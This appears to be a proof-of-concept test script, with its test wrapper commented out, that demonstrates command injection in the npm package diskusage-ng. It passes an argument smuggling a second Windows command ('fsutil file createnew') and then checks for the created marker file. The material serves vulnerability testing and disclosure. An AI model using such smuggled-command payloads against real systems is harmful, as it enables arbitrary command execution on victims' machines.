// test("Command Injection in diskusage-ng", (done) => {
//   expect.assertions(2);
  const root = require("diskusage-ng");
  const fs = require("fs");
  const path = "./diskusage-ng";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  root(['"& fsutil file createnew diskusage-ng 0"'], () => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlinkSync(path);
//     done();
  });
// });
